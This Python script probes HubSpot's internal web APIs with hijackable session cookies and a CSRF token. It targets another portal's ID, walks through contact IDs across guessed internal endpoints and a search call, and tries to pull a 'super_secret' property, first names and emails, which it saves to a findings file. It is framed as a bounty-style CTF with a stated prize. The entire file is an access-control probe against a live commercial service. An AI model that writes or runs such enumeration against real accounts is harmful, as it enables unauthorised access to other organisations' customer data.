#!/usr/bin/env python3
"""
Probe HubSpot Internal APIs
Tests internal API endpoints that the browser uses to load data
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

# Extract CSRF token
csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

print("="*80)
print("Probing HubSpot Internal APIs")
print("="*80)
print(f"CSRF token: {csrf_token[:30] if csrf_token else 'Not found'}...")
print("="*80)

findings = []

headers = {
    'Cookie': SESSION_COOKIES,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'
}

if csrf_token:
    headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

# ============================================================================
# TEST INTERNAL API PATTERNS
# ============================================================================

contact_ids = [1, 2, 3, 5, 10]

for cid in contact_ids:
    print(f"\n{'='*80}")
    print(f"Testing APIs for Contact {cid}")
    print(f"{'='*80}")

    # Common internal API patterns
    api_patterns = [
        # CRM object endpoint
        f'https://app.hubspot.com/api/crm-objects/v1/objects/contacts/{cid}?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/{cid}?portalId={TARGET_PORTAL}',

        # Contacts API
        f'https://app.hubspot.com/api/contacts/v2/contact/{cid}?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/contacts/v1/contact/vid/{cid}/profile?portalId={TARGET_PORTAL}&includeDeletes=false',

        # Sales API (internal)
        f'https://app.hubspot.com/sales-api/v1/contact/{cid}?portalId={TARGET_PORTAL}',

        # CRM API
        f'https://app.hubspot.com/crm-search/search?portalId={TARGET_PORTAL}&objectTypeId=0-1&query={cid}',

        # Internal object API
        f'https://app.hubspot.com/api/sales/v3/objects/contacts/{cid}?portalId={TARGET_PORTAL}',
    ]

    for url in api_patterns:
        try:
            endpoint = url.split('.com')[1][:90]
            print(f"\n  {endpoint}")

            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()

                    # Check for contact data
                    if 'properties' in data or 'contact' in str(data).lower():
                        print(f"  *** SUCCESS - Got contact data ***")

                        # Look for super_secret
                        data_str = json.dumps(data)
                        if 'super_secret' in data_str.lower():
                            print(f"  *** FOUND super_secret ***")

                            # Try to extract it
                            if isinstance(data, dict):
                                props = data.get('properties', {})
                                if 'super_secret' in props:
                                    print(f"\n  ========================================")
                                    print(f"  CTF FLAG FOUND!")
                                    print(f"  ========================================")
                                    print(f"  Contact ID: {cid}")
                                    print(f"  super_secret: {props['super_secret']}")
                                    print(f"  firstname: {props.get('firstname', 'N/A')}")
                                    print(f"  ========================================")

                                    findings.append({
                                        'contact_id': cid,
                                        'endpoint': url,
                                        'super_secret': props['super_secret'],
                                        'firstname': props.get('firstname'),
                                        'full_data': data
                                    })

                        # Show some properties
                        if isinstance(data, dict) and 'properties' in data:
                            props = data['properties']
                            print(f"  Properties found: {list(props.keys())[:10]}")
                            if 'firstname' in props:
                                print(f"    firstname: {props['firstname']}")
                            if 'email' in props:
                                print(f"    email: {props.get('email', 'N/A')}")

                        else:
                            print(f"  Data keys: {list(data.keys())[:10] if isinstance(data, dict) else 'not dict'}")

                except Exception as e:
                    print(f"  Response (not JSON or error): {r.text[:200]}")
                    print(f"  Error: {str(e)[:100]}")

            elif r.status_code == 401:
                print(f"  401 Unauthorized - session may have expired")
            elif r.status_code == 403:
                print(f"  403 Forbidden - no access to this resource")
            elif r.status_code == 404:
                print(f"  404 Not Found - endpoint doesn't exist or contact not found")

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# TRY SEARCH API
# ============================================================================

print(f"\n{'='*80}")
print("Testing Search API")
print(f"{'='*80}")

search_url = f'https://app.hubspot.com/api/crm-search/search'

search_payload = {
    'portalId': TARGET_PORTAL,
    'objectTypeId': '0-1',  # contacts
    'query': '',
    'count': 10,
    'properties': ['firstname', 'super_secret', 'email']
}

try:
    r = requests.post(search_url, headers=headers, json=search_payload, verify=False, timeout=10)
    print(f"Status: {r.status_code}")

    if r.status_code == 200:
        data = r.json()
        print(f"Response: {json.dumps(data, indent=2)[:500]}")

        if 'results' in data:
            for result in data['results']:
                if 'super_secret' in str(result).lower():
                    print(f"\n*** super_secret found in search results ***")
                    findings.append({
                        'source': 'search_api',
                        'result': result
                    })

except Exception as e:
    print(f"Error: {str(e)[:100]}")

# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "="*80)
print(f"Internal API Probing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** SUCCESSFUL DATA EXTRACTION ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. Contact {finding.get('contact_id', 'N/A')}")

        if 'super_secret' in finding:
            print(f"\n   ========================================")
            print(f"   CTF FLAG: {finding['super_secret']}")
            print(f"   ========================================")
            print(f"   Firstname: {finding.get('firstname', 'N/A')}")
            print(f"   Endpoint: {finding.get('endpoint', 'N/A')[:80]}")

        print()

    # Save findings
    with open('/home/user/Hub/findings/internal_api_success.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/internal_api_success.json")

    # Check if we got the CTF flag
    for finding in findings:
        if 'super_secret' in finding:
            print("\n" + "="*80)
            print("CTF CHALLENGE SOLVED!")
            print("="*80)
            print(f"super_secret property value: {finding['super_secret']}")
            print(f"firstname property value: {finding.get('firstname', 'N/A')}")
            print("="*80)
            print(f"\nPrize: $15,000 (firstname) + $5,000 (super_secret) = $20,000")
            print("="*80)

else:
    print("\nNo super_secret data found via internal APIs.")
    print("\nSuggestions:")
    print("  1. Session cookies may have expired")
    print("  2. API endpoints have changed")
    print("  3. Need to find correct internal API pattern")
    print("  4. May need to capture actual browser requests")
